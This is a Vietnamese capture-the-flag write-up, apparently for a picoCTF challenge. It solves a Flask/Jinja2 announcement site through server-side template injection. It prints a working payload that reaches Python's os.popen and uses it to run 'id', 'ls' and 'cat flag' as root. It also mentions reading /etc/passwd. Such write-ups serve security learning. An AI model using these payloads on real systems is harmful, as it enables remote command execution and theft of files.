<img width="1841" height="907" alt="image" src="https://github.com/user-attachments/assets/d2454490-c7e5-4828-a062-e0c00be2c179" />

I built a cool website that lets you announce whatever you want!*

Mình có thể ghi bất cứ cái gì , ngay cả những câu lệnh .
vậy , tại sao ta không ghi những câu lệnh để xem có thể mở ra cái gì đó hay ho từ dòng đó không .

Chúng ta thử với mẫu sau : {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

Phân tích chi tiết từng thành phần

{{ ... }}: Đây là cú pháp biểu thức của template engine (như Jinja2). Nó báo cho máy chủ biết rằng nội dung bên trong cần được đánh giá (evaluate) như một đoạn mã Python và kết quả sẽ được in ra trang web.

request: Đây là đối tượng đại diện cho HTTP request hiện tại do người dùng gửi lên. Trong môi trường Flask, đối tượng này thường được cung cấp sẵn bên trong template.

.application: Truy cập vào đối tượng ứng dụng gốc (WSGI application) đang chạy.

.__globals__: Truy cập vào từ điển chứa tất cả các biến toàn cục (global variables) của module đang chứa ứng dụng.

.__builtins__: Đây là bước "thoát ngục" (sandbox escape) quan trọng. Nó cho phép truy cập vào các hàm tích hợp sẵn của Python (built-in functions) mà bình thường template engine cố gắng ẩn đi để bảo mật, chẳng hạn như hàm __import__, eval, open.

.__import__('os'): Sử dụng hàm built-in vừa lấy được để nạp (import) thư viện os của Python. Thư viện này chứa các hàm dùng để tương tác trực tiếp với hệ điều hành của máy chủ.

.popen('id'): Gọi hàm popen từ thư viện os để mở một tiến trình và chạy lệnh shell là id. Trong hệ điều hành Linux/Unix, lệnh id được dùng để xem thông tin về người dùng (UID, GID) đang thực thi tiến trình đó. (Kẻ tấn công có thể thay thế id bằng bất kỳ lệnh nguy hiểm nào khác như ls, cat /etc/passwd, v.v.).

.read(): Đọc kết quả đầu ra (output) của lệnh id vừa chạy, để nó được hiển thị lên trang web thông qua cú pháp {{ ... }}.


Sau khi mở , thấy có thể leo root : uid=0(root) gid=0(root) groups=0(root)
<img width="1598" height="461" alt="image" src="https://github.com/user-attachments/assets/857b7488-e92a-46ad-bc06-d6eadbb476b6" />


Chúng ta thử ls thay cho id nó ra xem có gì

{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}
<img width="1674" height="797" alt="image" src="https://github.com/user-attachments/assets/4c079206-7147-4b12-a756-7e948c485f07" />


thấy dc nội dung bên trong : __pycache__ app.py flag requirements.txt 

Mở file thôi

{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
<img width="1661" height="438" alt="image" src="https://github.com/user-attachments/assets/6a3bc5d8-c492-4084-99d0-dbda30391497" />


picoCTF{s4rv3r\_s1d3\_t3mp14t3\_1nj3ct10n5\_4r3\_c001\_bcf73b04}

